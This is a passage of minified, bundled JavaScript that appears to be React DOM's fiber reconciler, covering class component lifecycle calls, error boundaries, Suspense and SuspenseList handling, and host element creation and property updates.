              ? !ns(n, r) || !ns(s, i)
              : !0
    );
}
function Fh(t, e, n) {
    var r = !1,
        s = Yt,
        i = e.contextType;
    return (
        typeof i == "object" && i !== null
            ? (i = Ke(i))
            : ((s = Re(e) ? _n : xe.current), (r = e.contextTypes), (i = (r = r != null) ? ir(t, s) : Yt)),
        (e = new e(n, i)),
        (t.memoizedState = e.state !== null && e.state !== void 0 ? e.state : null),
        (e.updater = Gi),
        (t.stateNode = e),
        (e._reactInternals = t),
        r &&
            ((t = t.stateNode),
            (t.__reactInternalMemoizedUnmaskedChildContext = s),
            (t.__reactInternalMemoizedMaskedChildContext = i)),
        e
    );
}
function lc(t, e, n, r) {
    (t = e.state),
        typeof e.componentWillReceiveProps == "function" && e.componentWillReceiveProps(n, r),
        typeof e.UNSAFE_componentWillReceiveProps == "function" && e.UNSAFE_componentWillReceiveProps(n, r),
        e.state !== t && Gi.enqueueReplaceState(e, e.state, null);
}
function Aa(t, e, n, r) {
    var s = t.stateNode;
    (s.props = n), (s.state = t.memoizedState), (s.refs = {}), Ul(t);
    var i = e.contextType;
    typeof i == "object" && i !== null ? (s.context = Ke(i)) : ((i = Re(e) ? _n : xe.current), (s.context = ir(t, i))),
        (s.state = t.memoizedState),
        (i = e.getDerivedStateFromProps),
        typeof i == "function" && (Ia(t, e, i, n), (s.state = t.memoizedState)),
        typeof e.getDerivedStateFromProps == "function" ||
            typeof s.getSnapshotBeforeUpdate == "function" ||
            (typeof s.UNSAFE_componentWillMount != "function" && typeof s.componentWillMount != "function") ||
            ((e = s.state),
            typeof s.componentWillMount == "function" && s.componentWillMount(),
            typeof s.UNSAFE_componentWillMount == "function" && s.UNSAFE_componentWillMount(),
            e !== s.state && Gi.enqueueReplaceState(s, s.state, null),
            ji(t, n, s, r),
            (s.state = t.memoizedState)),
        typeof s.componentDidMount == "function" && (t.flags |= 4194308);
}
function ur(t, e) {
    try {
        var n = "",
            r = e;
        do (n += qp(r)), (r = r.return);
        while (r);
        var s = n;
    } catch (i) {
        s =
            `
Error generating stack: ` +
            i.message +
            `
` +
            i.stack;
    }
    return { value: t, source: e, stack: s, digest: null };
}
function Do(t, e, n) {
    return { value: t, source: null, stack: n ?? null, digest: e ?? null };
}
function La(t, e) {
    try {
        console.error(e.value);
    } catch (n) {
        setTimeout(function () {
            throw n;
        });
    }
}
var x0 = typeof WeakMap == "function" ? WeakMap : Map;
function Bh(t, e, n) {
    (n = _t(-1, n)), (n.tag = 3), (n.payload = { element: null });
    var r = e.value;
    return (
        (n.callback = function () {
            Ti || ((Ti = !0), (qa = r)), La(t, e);
        }),
        n
    );
}
function Vh(t, e, n) {
    (n = _t(-1, n)), (n.tag = 3);
    var r = t.type.getDerivedStateFromError;
    if (typeof r == "function") {
        var s = e.value;
        (n.payload = function () {
            return r(s);
        }),
            (n.callback = function () {
                La(t, e);
            });
    }
    var i = t.stateNode;
    return (
        i !== null &&
            typeof i.componentDidCatch == "function" &&
            (n.callback = function () {
                La(t, e), typeof r != "function" && (Kt === null ? (Kt = new Set([this])) : Kt.add(this));
                var o = e.stack;
                this.componentDidCatch(e.value, { componentStack: o !== null ? o : "" });
            }),
        n
    );
}
function uc(t, e, n) {
    var r = t.pingCache;
    if (r === null) {
        r = t.pingCache = new x0();
        var s = new Set();
        r.set(e, s);
    } else (s = r.get(e)), s === void 0 && ((s = new Set()), r.set(e, s));
    s.has(n) || (s.add(n), (t = $0.bind(null, t, e, n)), e.then(t, t));
}
function cc(t) {
    do {
        var e;
        if (((e = t.tag === 13) && ((e = t.memoizedState), (e = e !== null ? e.dehydrated !== null : !0)), e)) return t;
        t = t.return;
    } while (t !== null);
    return null;
}
function dc(t, e, n, r, s) {
    return t.mode & 1
        ? ((t.flags |= 65536), (t.lanes = s), t)
        : (t === e
              ? (t.flags |= 65536)
              : ((t.flags |= 128),
                (n.flags |= 131072),
                (n.flags &= -52805),
                n.tag === 1 && (n.alternate === null ? (n.tag = 17) : ((e = _t(-1, 1)), (e.tag = 2), Gt(n, e, 1))),
                (n.lanes |= 1)),
          t);
}
var w0 = Et.ReactCurrentOwner,
    Pe = !1;
function be(t, e, n, r) {
    e.child = t === null ? yh(e, null, n, r) : ar(e, t.child, n, r);
}
function hc(t, e, n, r, s) {
    n = n.render;
    var i = e.ref;
    return (
        tr(e, s),
        (r = Vl(t, e, n, r, i, s)),
        (n = Wl()),
        t !== null && !Pe
            ? ((e.updateQueue = t.updateQueue), (e.flags &= -2053), (t.lanes &= ~s), jt(t, e, s))
            : (K && n && Rl(e), (e.flags |= 1), be(t, e, r, s), e.child)
    );
}
function fc(t, e, n, r, s) {
    if (t === null) {
        var i = n.type;
        return typeof i == "function" &&
            !eu(i) &&
            i.defaultProps === void 0 &&
            n.compare === null &&
            n.defaultProps === void 0
            ? ((e.tag = 15), (e.type = i), Wh(t, e, i, r, s))
            : ((t = oi(n.type, null, r, e, e.mode, s)), (t.ref = e.ref), (t.return = e), (e.child = t));
    }
    if (((i = t.child), !(t.lanes & s))) {
        var o = i.memoizedProps;
        if (((n = n.compare), (n = n !== null ? n : ns), n(o, r) && t.ref === e.ref)) return jt(t, e, s);
    }
    return (e.flags |= 1), (t = Jt(i, r)), (t.ref = e.ref), (t.return = e), (e.child = t);
}
function Wh(t, e, n, r, s) {
    if (t !== null) {
        var i = t.memoizedProps;
        if (ns(i, r) && t.ref === e.ref)
            if (((Pe = !1), (e.pendingProps = r = i), (t.lanes & s) !== 0)) t.flags & 131072 && (Pe = !0);
            else return (e.lanes = t.lanes), jt(t, e, s);
    }
    return Ma(t, e, n, r, s);
}
function Hh(t, e, n) {
    var r = e.pendingProps,
        s = r.children,
        i = t !== null ? t.memoizedState : null;
    if (r.mode === "hidden")
        if (!(e.mode & 1))
            (e.memoizedState = { baseLanes: 0, cachePool: null, transitions: null }), V(Jn, Ie), (Ie |= n);
        else {
            if (!(n & 1073741824))
                return (
                    (t = i !== null ? i.baseLanes | n : n),
                    (e.lanes = e.childLanes = 1073741824),
                    (e.memoizedState = { baseLanes: t, cachePool: null, transitions: null }),
                    (e.updateQueue = null),
                    V(Jn, Ie),
                    (Ie |= t),
                    null
                );
            (e.memoizedState = { baseLanes: 0, cachePool: null, transitions: null }),
                (r = i !== null ? i.baseLanes : n),
                V(Jn, Ie),
                (Ie |= r);
        }
    else i !== null ? ((r = i.baseLanes | n), (e.memoizedState = null)) : (r = n), V(Jn, Ie), (Ie |= r);
    return be(t, e, s, n), e.child;
}
function qh(t, e) {
    var n = e.ref;
    ((t === null && n !== null) || (t !== null && t.ref !== n)) && ((e.flags |= 512), (e.flags |= 2097152));
}
function Ma(t, e, n, r, s) {
    var i = Re(n) ? _n : xe.current;
    return (
        (i = ir(e, i)),
        tr(e, s),
        (n = Vl(t, e, n, r, i, s)),
        (r = Wl()),
        t !== null && !Pe
            ? ((e.updateQueue = t.updateQueue), (e.flags &= -2053), (t.lanes &= ~s), jt(t, e, s))
            : (K && r && Rl(e), (e.flags |= 1), be(t, e, n, s), e.child)
    );
}
function pc(t, e, n, r, s) {
    if (Re(n)) {
        var i = !0;
        wi(e);
    } else i = !1;
    if ((tr(e, s), e.stateNode === null)) ri(t, e), Fh(e, n, r), Aa(e, n, r, s), (r = !0);
    else if (t === null) {
        var o = e.stateNode,
            a = e.memoizedProps;
        o.props = a;
        var l = o.context,
            c = n.contextType;
        typeof c == "object" && c !== null ? (c = Ke(c)) : ((c = Re(n) ? _n : xe.current), (c = ir(e, c)));
        var d = n.getDerivedStateFromProps,
            h = typeof d == "function" || typeof o.getSnapshotBeforeUpdate == "function";
        h ||
            (typeof o.UNSAFE_componentWillReceiveProps != "function" &&
                typeof o.componentWillReceiveProps != "function") ||
            ((a !== r || l !== c) && lc(e, o, r, c)),
            (At = !1);
        var f = e.memoizedState;
        (o.state = f),
            ji(e, r, o, s),
            (l = e.memoizedState),
            a !== r || f !== l || Te.current || At
                ? (typeof d == "function" && (Ia(e, n, d, r), (l = e.memoizedState)),
                  (a = At || ac(e, n, a, r, f, l, c))
                      ? (h ||
                            (typeof o.UNSAFE_componentWillMount != "function" &&
                                typeof o.componentWillMount != "function") ||
                            (typeof o.componentWillMount == "function" && o.componentWillMount(),
                            typeof o.UNSAFE_componentWillMount == "function" && o.UNSAFE_componentWillMount()),
                        typeof o.componentDidMount == "function" && (e.flags |= 4194308))
                      : (typeof o.componentDidMount == "function" && (e.flags |= 4194308),
                        (e.memoizedProps = r),
                        (e.memoizedState = l)),
                  (o.props = r),
                  (o.state = l),
                  (o.context = c),
                  (r = a))
                : (typeof o.componentDidMount == "function" && (e.flags |= 4194308), (r = !1));
    } else {
        (o = e.stateNode),
            wh(t, e),
            (a = e.memoizedProps),
            (c = e.type === e.elementType ? a : Ye(e.type, a)),
            (o.props = c),
            (h = e.pendingProps),
            (f = o.context),
            (l = n.contextType),
            typeof l == "object" && l !== null ? (l = Ke(l)) : ((l = Re(n) ? _n : xe.current), (l = ir(e, l)));
        var v = n.getDerivedStateFromProps;
        (d = typeof v == "function" || typeof o.getSnapshotBeforeUpdate == "function") ||
            (typeof o.UNSAFE_componentWillReceiveProps != "function" &&
                typeof o.componentWillReceiveProps != "function") ||
            ((a !== h || f !== l) && lc(e, o, r, l)),
            (At = !1),
            (f = e.memoizedState),
            (o.state = f),
            ji(e, r, o, s);
        var y = e.memoizedState;
        a !== h || f !== y || Te.current || At
            ? (typeof v == "function" && (Ia(e, n, v, r), (y = e.memoizedState)),
              (c = At || ac(e, n, c, r, f, y, l) || !1)
                  ? (d ||
                        (typeof o.UNSAFE_componentWillUpdate != "function" &&
                            typeof o.componentWillUpdate != "function") ||
                        (typeof o.componentWillUpdate == "function" && o.componentWillUpdate(r, y, l),
                        typeof o.UNSAFE_componentWillUpdate == "function" && o.UNSAFE_componentWillUpdate(r, y, l)),
                    typeof o.componentDidUpdate == "function" && (e.flags |= 4),
                    typeof o.getSnapshotBeforeUpdate == "function" && (e.flags |= 1024))
                  : (typeof o.componentDidUpdate != "function" ||
                        (a === t.memoizedProps && f === t.memoizedState) ||
                        (e.flags |= 4),
                    typeof o.getSnapshotBeforeUpdate != "function" ||
                        (a === t.memoizedProps && f === t.memoizedState) ||
                        (e.flags |= 1024),
                    (e.memoizedProps = r),
                    (e.memoizedState = y)),
              (o.props = r),
              (o.state = y),
              (o.context = l),
              (r = c))
            : (typeof o.componentDidUpdate != "function" ||
                  (a === t.memoizedProps && f === t.memoizedState) ||
                  (e.flags |= 4),
              typeof o.getSnapshotBeforeUpdate != "function" ||
                  (a === t.memoizedProps && f === t.memoizedState) ||
                  (e.flags |= 1024),
              (r = !1));
    }
    return Ua(t, e, n, r, i, s);
}
function Ua(t, e, n, r, s, i) {
    qh(t, e);
    var o = (e.flags & 128) !== 0;
    if (!r && !o) return s && Zu(e, n, !1), jt(t, e, i);
    (r = e.stateNode), (w0.current = e);
    var a = o && typeof n.getDerivedStateFromError != "function" ? null : r.render();
    return (
        (e.flags |= 1),
        t !== null && o ? ((e.child = ar(e, t.child, null, i)), (e.child = ar(e, null, a, i))) : be(t, e, a, i),
        (e.memoizedState = r.state),
        s && Zu(e, n, !0),
        e.child
    );
}
function Gh(t) {
    var e = t.stateNode;
    e.pendingContext ? Yu(t, e.pendingContext, e.pendingContext !== e.context) : e.context && Yu(t, e.context, !1),
        Dl(t, e.containerInfo);
}
function mc(t, e, n, r, s) {
    return or(), $l(s), (e.flags |= 256), be(t, e, n, r), e.child;
}
var Da = { dehydrated: null, treeContext: null, retryLane: 0 };
function za(t) {
    return { baseLanes: t, cachePool: null, transitions: null };
}
function Kh(t, e, n) {
    var r = e.pendingProps,
        s = Q.current,
        i = !1,
        o = (e.flags & 128) !== 0,
        a;
    if (
        ((a = o) || (a = t !== null && t.memoizedState === null ? !1 : (s & 2) !== 0),
        a ? ((i = !0), (e.flags &= -129)) : (t === null || t.memoizedState !== null) && (s |= 1),
        V(Q, s & 1),
        t === null)
    )
        return (
            Oa(e),
            (t = e.memoizedState),
            t !== null && ((t = t.dehydrated), t !== null)
                ? (e.mode & 1 ? (t.data === "$!" ? (e.lanes = 8) : (e.lanes = 1073741824)) : (e.lanes = 1), null)
                : ((o = r.children),
                  (t = r.fallback),
                  i
                      ? ((r = e.mode),
                        (i = e.child),
                        (o = { mode: "hidden", children: o }),
                        !(r & 1) && i !== null ? ((i.childLanes = 0), (i.pendingProps = o)) : (i = Ji(o, r, 0, null)),
                        (t = xn(t, r, n, null)),
                        (i.return = e),
                        (t.return = e),
                        (i.sibling = t),
                        (e.child = i),
                        (e.child.memoizedState = za(n)),
                        (e.memoizedState = Da),
                        t)
                      : Gl(e, o))
        );
    if (((s = t.memoizedState), s !== null && ((a = s.dehydrated), a !== null))) return _0(t, e, o, r, a, s, n);
    if (i) {
        (i = r.fallback), (o = e.mode), (s = t.child), (a = s.sibling);
        var l = { mode: "hidden", children: r.children };
        return (
            !(o & 1) && e.child !== s
                ? ((r = e.child), (r.childLanes = 0), (r.pendingProps = l), (e.deletions = null))
                : ((r = Jt(s, l)), (r.subtreeFlags = s.subtreeFlags & 14680064)),
            a !== null ? (i = Jt(a, i)) : ((i = xn(i, o, n, null)), (i.flags |= 2)),
            (i.return = e),
            (r.return = e),
            (r.sibling = i),
            (e.child = r),
            (r = i),
            (i = e.child),
            (o = t.child.memoizedState),
            (o = o === null ? za(n) : { baseLanes: o.baseLanes | n, cachePool: null, transitions: o.transitions }),
            (i.memoizedState = o),
            (i.childLanes = t.childLanes & ~n),
            (e.memoizedState = Da),
            r
        );
    }
    return (
        (i = t.child),
        (t = i.sibling),
        (r = Jt(i, { mode: "visible", children: r.children })),
        !(e.mode & 1) && (r.lanes = n),
        (r.return = e),
        (r.sibling = null),
        t !== null && ((n = e.deletions), n === null ? ((e.deletions = [t]), (e.flags |= 16)) : n.push(t)),
        (e.child = r),
        (e.memoizedState = null),
        r
    );
}
function Gl(t, e) {
    return (e = Ji({ mode: "visible", children: e }, t.mode, 0, null)), (e.return = t), (t.child = e);
}
function zs(t, e, n, r) {
    return (
        r !== null && $l(r),
        ar(e, t.child, null, n),
        (t = Gl(e, e.pendingProps.children)),
        (t.flags |= 2),
        (e.memoizedState = null),
        t
    );
}
function _0(t, e, n, r, s, i, o) {
    if (n)
        return e.flags & 256
            ? ((e.flags &= -257), (r = Do(Error(S(422)))), zs(t, e, o, r))
            : e.memoizedState !== null
              ? ((e.child = t.child), (e.flags |= 128), null)
              : ((i = r.fallback),
                (s = e.mode),
                (r = Ji({ mode: "visible", children: r.children }, s, 0, null)),
                (i = xn(i, s, o, null)),
                (i.flags |= 2),
                (r.return = e),
                (i.return = e),
                (r.sibling = i),
                (e.child = r),
                e.mode & 1 && ar(e, t.child, null, o),
                (e.child.memoizedState = za(o)),
                (e.memoizedState = Da),
                i);
    if (!(e.mode & 1)) return zs(t, e, o, null);
    if (s.data === "$!") {
        if (((r = s.nextSibling && s.nextSibling.dataset), r)) var a = r.dgst;
        return (r = a), (i = Error(S(419))), (r = Do(i, r, void 0)), zs(t, e, o, r);
    }
    if (((a = (o & t.childLanes) !== 0), Pe || a)) {
        if (((r = le), r !== null)) {
            switch (o & -o) {
                case 4:
                    s = 2;
                    break;
                case 16:
                    s = 8;
                    break;
                case 64:
                case 128:
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                case 4194304:
                case 8388608:
                case 16777216:
                case 33554432:
                case 67108864:
                    s = 32;
                    break;
                case 536870912:
                    s = 268435456;
                    break;
                default:
                    s = 0;
            }
            (s = s & (r.suspendedLanes | o) ? 0 : s),
                s !== 0 && s !== i.retryLane && ((i.retryLane = s), St(t, s), rt(r, t, s, -1));
        }
        return Zl(), (r = Do(Error(S(421)))), zs(t, e, o, r);
    }
    return s.data === "$?"
        ? ((e.flags |= 128), (e.child = t.child), (e = I0.bind(null, t)), (s._reactRetry = e), null)
        : ((t = i.treeContext),
          (Ae = qt(s.nextSibling)),
          (Le = e),
          (K = !0),
          (tt = null),
          t !== null && ((Be[Ve++] = xt), (Be[Ve++] = wt), (Be[Ve++] = bn), (xt = t.id), (wt = t.overflow), (bn = e)),
          (e = Gl(e, r.children)),
          (e.flags |= 4096),
          e);
}
function gc(t, e, n) {
    t.lanes |= e;
    var r = t.alternate;
    r !== null && (r.lanes |= e), $a(t.return, e, n);
}
function zo(t, e, n, r, s) {
    var i = t.memoizedState;
    i === null
        ? (t.memoizedState = { isBackwards: e, rendering: null, renderingStartTime: 0, last: r, tail: n, tailMode: s })
        : ((i.isBackwards = e),
          (i.rendering = null),
          (i.renderingStartTime = 0),
          (i.last = r),
          (i.tail = n),
          (i.tailMode = s));
}
function Qh(t, e, n) {
    var r = e.pendingProps,
        s = r.revealOrder,
        i = r.tail;
    if ((be(t, e, r.children, n), (r = Q.current), r & 2)) (r = (r & 1) | 2), (e.flags |= 128);
    else {
        if (t !== null && t.flags & 128)
            e: for (t = e.child; t !== null; ) {
                if (t.tag === 13) t.memoizedState !== null && gc(t, n, e);
                else if (t.tag === 19) gc(t, n, e);
                else if (t.child !== null) {
                    (t.child.return = t), (t = t.child);
                    continue;
                }
                if (t === e) break e;
                for (; t.sibling === null; ) {
                    if (t.return === null || t.return === e) break e;
                    t = t.return;
                }
                (t.sibling.return = t.return), (t = t.sibling);
            }
        r &= 1;
    }
    if ((V(Q, r), !(e.mode & 1))) e.memoizedState = null;
    else
        switch (s) {
            case "forwards":
                for (n = e.child, s = null; n !== null; )
                    (t = n.alternate), t !== null && Ei(t) === null && (s = n), (n = n.sibling);
                (n = s),
                    n === null ? ((s = e.child), (e.child = null)) : ((s = n.sibling), (n.sibling = null)),
                    zo(e, !1, s, n, i);
                break;
            case "backwards":
                for (n = null, s = e.child, e.child = null; s !== null; ) {
                    if (((t = s.alternate), t !== null && Ei(t) === null)) {
                        e.child = s;
                        break;
                    }
                    (t = s.sibling), (s.sibling = n), (n = s), (s = t);
                }
                zo(e, !0, n, null, i);
                break;
            case "together":
                zo(e, !1, null, null, void 0);
                break;
            default:
                e.memoizedState = null;
        }
    return e.child;
}
function ri(t, e) {
    !(e.mode & 1) && t !== null && ((t.alternate = null), (e.alternate = null), (e.flags |= 2));
}
function jt(t, e, n) {
    if ((t !== null && (e.dependencies = t.dependencies), (Sn |= e.lanes), !(n & e.childLanes))) return null;
    if (t !== null && e.child !== t.child) throw Error(S(153));
    if (e.child !== null) {
        for (t = e.child, n = Jt(t, t.pendingProps), e.child = n, n.return = e; t.sibling !== null; )
            (t = t.sibling), (n = n.sibling = Jt(t, t.pendingProps)), (n.return = e);
        n.sibling = null;
    }
    return e.child;
}
function b0(t, e, n) {
    switch (e.tag) {
        case 3:
            Gh(e), or();
            break;
        case 5:
            _h(e);
            break;
        case 1:
            Re(e.type) && wi(e);
            break;
        case 4:
            Dl(e, e.stateNode.containerInfo);
            break;
        case 10:
            var r = e.type._context,
                s = e.memoizedProps.value;
            V(ki, r._currentValue), (r._currentValue = s);
            break;
        case 13:
            if (((r = e.memoizedState), r !== null))
                return r.dehydrated !== null
                    ? (V(Q, Q.current & 1), (e.flags |= 128), null)
                    : n & e.child.childLanes
                      ? Kh(t, e, n)
                      : (V(Q, Q.current & 1), (t = jt(t, e, n)), t !== null ? t.sibling : null);
            V(Q, Q.current & 1);
            break;
        case 19:
            if (((r = (n & e.childLanes) !== 0), t.flags & 128)) {
                if (r) return Qh(t, e, n);
                e.flags |= 128;
            }
            if (
                ((s = e.memoizedState),
                s !== null && ((s.rendering = null), (s.tail = null), (s.lastEffect = null)),
                V(Q, Q.current),
                r)
            )
                break;
            return null;
        case 22:
        case 23:
            return (e.lanes = 0), Hh(t, e, n);
    }
    return jt(t, e, n);
}
var Jh, Fa, Xh, Yh;
Jh = function (t, e) {
    for (var n = e.child; n !== null; ) {
        if (n.tag === 5 || n.tag === 6) t.appendChild(n.stateNode);
        else if (n.tag !== 4 && n.child !== null) {
            (n.child.return = n), (n = n.child);
            continue;
        }
        if (n === e) break;
        for (; n.sibling === null; ) {
            if (n.return === null || n.return === e) return;
            n = n.return;
        }
        (n.sibling.return = n.return), (n = n.sibling);
    }
};
Fa = function () {};
Xh = function (t, e, n, r) {
    var s = t.memoizedProps;
    if (s !== r) {
        (t = e.stateNode), vn(ft.current);
        var i = null;
        switch (n) {
            case "input":
                (s = ua(t, s)), (r = ua(t, r)), (i = []);
                break;
            case "select":
                (s = X({}, s, { value: void 0 })), (r = X({}, r, { value: void 0 })), (i = []);
                break;
            case "textarea":
                (s = ha(t, s)), (r = ha(t, r)), (i = []);
                break;
            default:
                typeof s.onClick != "function" && typeof r.onClick == "function" && (t.onclick = yi);
        }
        pa(n, r);
        var o;
        n = null;
        for (c in s)
            if (!r.hasOwnProperty(c) && s.hasOwnProperty(c) && s[c] != null)
                if (c === "style") {
                    var a = s[c];
                    for (o in a) a.hasOwnProperty(o) && (n || (n = {}), (n[o] = ""));
                } else
                    c !== "dangerouslySetInnerHTML" &&
                        c !== "children" &&
                        c !== "suppressContentEditableWarning" &&
                        c !== "suppressHydrationWarning" &&
                        c !== "autoFocus" &&
                        (Qr.hasOwnProperty(c) ? i || (i = []) : (i = i || []).push(c, null));
        for (c in r) {
            var l = r[c];
            if (((a = s != null ? s[c] : void 0), r.hasOwnProperty(c) && l !== a && (l != null || a != null)))
                if (c === "style")
                    if (a) {
                        for (o in a) !a.hasOwnProperty(o) || (l && l.hasOwnProperty(o)) || (n || (n = {}), (n[o] = ""));
                        for (o in l) l.hasOwnProperty(o) && a[o] !== l[o] && (n || (n = {}), (n[o] = l[o]));
                    } else n || (i || (i = []), i.push(c, n)), (n = l);
                else
                    c === "dangerouslySetInnerHTML"
                        ? ((l = l ? l.__html : void 0),
                          (a = a ? a.__html : void 0),
                          l != null && a !== l && (i = i || []).push(c, l))
                        : c === "children"
                          ? (typeof l != "string" && typeof l != "number") || (i = i || []).push(c, "" + l)
                          : c !== "suppressContentEditableWarning" &&
                            c !== "suppressHydrationWarning" &&
                            (Qr.hasOwnProperty(c)
                                ? (l != null && c === "onScroll" && H("scroll", t), i || a === l || (i = []))
                                : (i = i || []).push(c, l));
        }
        n && (i = i || []).push("style", n);
        var c = i;
        (e.updateQueue = c) && (e.flags |= 4);
    }
};
Yh = function (t, e, n, r) {
    n !== r && (e.flags |= 4);
};
function Nr(t, e) {
    if (!K)
        switch (t.tailMode) {
            case "hidden":
                e = t.tail;
                for (var n = null; e !== null; ) e.alternate !== null && (n = e), (e = e.sibling);
                n === null ? (t.tail = null) : (n.sibling = null);
                break;
            case "collapsed":
                n = t.tail;
                for (var r = null; n !== null; ) n.alternate !== null && (r = n), (n = n.sibling);
                r === null ? (e || t.tail === null ? (t.tail = null) : (t.tail.sibling = null)) : (r.sibling = null);
        }
}
function ve(t) {
    var e = t.alternate !== null && t.alternate.child === t.child,
        n = 0,
        r = 0;
    if (e)
        for (var s = t.child; s !== null; )
            (n |= s.lanes | s.childLanes),
                (r |= s.subtreeFlags & 14680064),
                (r |= s.flags & 14680064),
                (s.return = t),
                (s = s.sibling);
    else
        for (s = t.child; s !== null; )
            (n |= s.lanes | s.childLanes), (r |= s.subtreeFlags), (r |= s.flags), (s.return = t), (s = s.sibling);
    return (t.subtreeFlags |= r), (t.childLanes = n), e;
}
function k0(t, e, n) {
    var r = e.pendingProps;
    switch ((Ol(e), e.tag)) {
        case 2:
        case 16:
        case 15:
        case 0:
        case 11:
        case 7:
        case 8:
        case 12:
        case 9:
        case 14:
            return ve(e), null;
        case 1:
            return Re(e.type) && xi(), ve(e), null;
        case 3:
            return (
                (r = e.stateNode),
                lr(),
                q(Te),
                q(xe),
                Fl(),
                r.pendingContext && ((r.context = r.pendingContext), (r.pendingContext = null)),
                (t === null || t.child === null) &&
                    (Us(e)
                        ? (e.flags |= 4)
                        : t === null ||
                          (t.memoizedState.isDehydrated && !(e.flags & 256)) ||
                          ((e.flags |= 1024), tt !== null && (Qa(tt), (tt = null)))),
                Fa(t, e),
                ve(e),
                null
            );
        case 5:
            zl(e);
            var s = vn(as.current);
            if (((n = e.type), t !== null && e.stateNode != null))
                Xh(t, e, n, r, s), t.ref !== e.ref && ((e.flags |= 512), (e.flags |= 2097152));
            else {
                if (!r) {
                    if (e.stateNode === null) throw Error(S(166));
                    return ve(e), null;
                }
                if (((t = vn(ft.current)), Us(e))) {
                    (r = e.stateNode), (n = e.type);
                    var i = e.memoizedProps;
                    switch (((r[dt] = e), (r[is] = i), (t = (e.mode & 1) !== 0), n)) {
                        case "dialog":
                            H("cancel", r), H("close", r);
                            break;
                        case "iframe":
                        case "object":
                        case "embed":
                            H("load", r);
                            break;
                        case "video":
                        case "audio":
                            for (s = 0; s < Ir.length; s++) H(Ir[s], r);
                            break;
                        case "source":
                            H("error", r);
                            break;
                        case "img":
                        case "image":
                        case "link":
                            H("error", r), H("load", r);
                            break;
                        case "details":
                            H("toggle", r);
                            break;
                        case "input":
                            ju(r, i), H("invalid", r);
                            break;
                        case "select":
                            (r._wrapperState = { wasMultiple: !!i.multiple }), H("invalid", r);
                            break;
                        case "textarea":
                            Nu(r, i), H("invalid", r);
                    }
                    pa(n, i), (s = null);
                    for (var o in i)
                        if (i.hasOwnProperty(o)) {
                            var a = i[o];
                            o === "children"
                                ? typeof a == "string"
                                    ? r.textContent !== a &&
                                      (i.suppressHydrationWarning !== !0 && Ms(r.textContent, a, t),
                                      (s = ["children", a]))
                                    : typeof a == "number" &&
                                      r.textContent !== "" + a &&
                                      (i.suppressHydrationWarning !== !0 && Ms(r.textContent, a, t),
                                      (s = ["children", "" + a]))
                                : Qr.hasOwnProperty(o) && a != null && o === "onScroll" && H("scroll", r);
                        }
                    switch (n) {
                        case "input":
                            Ps(r), Eu(r, i, !0);
                            break;
                        case "textarea":
                            Ps(r), Cu(r);
                            break;
                        case "select":
                        case "option":
                            break;
                        default:
                            typeof i.onClick == "function" && (r.onclick = yi);
                    }
                    (r = s), (e.updateQueue = r), r !== null && (e.flags |= 4);
                } else {
                    (o = s.nodeType === 9 ? s : s.ownerDocument),
                        t === "http://www.w3.org/1999/xhtml" && (t = Ed(n)),
                        t === "http://www.w3.org/1999/xhtml"
                            ? n === "script"
                                ? ((t = o.createElement("div")),
                                  (t.innerHTML = "<script></script>"),
                                  (t = t.removeChild(t.firstChild)))
                                : typeof r.is == "string"
                                  ? (t = o.createElement(n, { is: r.is }))
                                  : ((t = o.createElement(n)),
                                    n === "select" &&
                                        ((o = t), r.multiple ? (o.multiple = !0) : r.size && (o.size = r.size)))
                            : (t = o.createElementNS(t, n)),
                        (t[dt] = e),
                        (t[is] = r),
                        Jh(t, e, !1, !1),
                        (e.stateNode = t);
                    e: {
                        switch (((o = ma(n, r)), n)) {
                            case "dialog":
                                H("cancel", t), H("close", t), (s = r);
                                break;
                            case "iframe":
                            case "object":
                            case "embed":
                                H("load", t), (s = r);
                                break;
                            case "video":
                            case "audio":
                                for (s = 0; s < Ir.length; s++) H(Ir[s], t);
                                s = r;
                                break;
                            case "source":
                                H("error", t), (s = r);
                                break;
                            case "img":
                            case "image":
                            case "link":
                                H("error", t), H("load", t), (s = r);
                                break;
                            case "details":
                                H("toggle", t), (s = r);
                                break;
                            case "input":
                                ju(t, r), (s = ua(t, r)), H("invalid", t);
                                break;
                            case "option":
                                s = r;
                                break;
                            case "select":
                                (t._wrapperState = { wasMultiple: !!r.multiple }),
                                    (s = X({}, r, { value: void 0 })),
                                    H("invalid", t);
                                break;
                            case "textarea":
                                Nu(t, r), (s = ha(t, r)), H("invalid", t);
                                break;
                            default:
                                s = r;
                        }
                        pa(n, s), (a = s);
                        for (i in a)
                            if (a.hasOwnProperty(i)) {
                                var l = a[i];
                                i === "style"
                                    ? Pd(t, l)
                                    : i === "dangerouslySetInnerHTML"
                                      ? ((l = l ? l.__html : void 0), l != null && Nd(t, l))
                                      : i === "children"
                                        ? typeof l == "string"
                                            ? (n !== "textarea" || l !== "") && Jr(t, l)
                                            : typeof l == "number" && Jr(t, "" + l)
                                        : i !== "suppressContentEditableWarning" &&
                                          i !== "suppressHydrationWarning" &&
                                          i !== "autoFocus" &&
                                          (Qr.hasOwnProperty(i)
                                              ? l != null && i === "onScroll" && H("scroll", t)
                                              : l != null && vl(t, i, l, o));
                            }
                        switch (n) {
                            case "input":
                                Ps(t), Eu(t, r, !1);
                                break;
                            case "textarea":
                                Ps(t), Cu(t);
                                break;
                            case "option":
                                r.value != null && t.setAttribute("value", "" + Xt(r.value));
                                break;
                            case "select":
                                (t.multiple = !!r.multiple),
                                    (i = r.value),
                                    i != null
                                        ? Xn(t, !!r.multiple, i, !1)
                                        : r.defaultValue != null && Xn(t, !!r.multiple, r.defaultValue, !0);
                                break;
                            default:
                                typeof s.onClick == "function" && (t.onclick = yi);
                        }
                        switch (n) {
                            case "button":
                            case "input":
                            case "select":
                            case "textarea":
                                r = !!r.autoFocus;
                                break e;
                            case "img":
                                r = !0;
                                break e;
                            default:
                                r = !1;
                        }
                    }
                    r && (e.flags |= 4);
                }
                e.ref !== null && ((e.flags |= 512), (e.flags |= 2097152));
            }
            return ve(e), null;
        case 6:
            if (t && e.stateNode != null) Yh(t, e, t.memoizedProps, r);
            else {
                if (typeof r != "string" && e.stateNode === null) throw Error(S(166));
                if (((n = vn(as.current)), vn(ft.current), Us(e))) {
                    if (
                        ((r = e.stateNode),
                        (n = e.memoizedProps),
                        (r[dt] = e),
                        (i = r.nodeValue !== n) && ((t = Le), t !== null))
                    )
                        switch (t.tag) {
                            case 3:
                                Ms(r.nodeValue, n, (t.mode & 1) !== 0);
                                break;
                            case 5:
                                t.memoizedProps.suppressHydrationWarning !== !0 &&
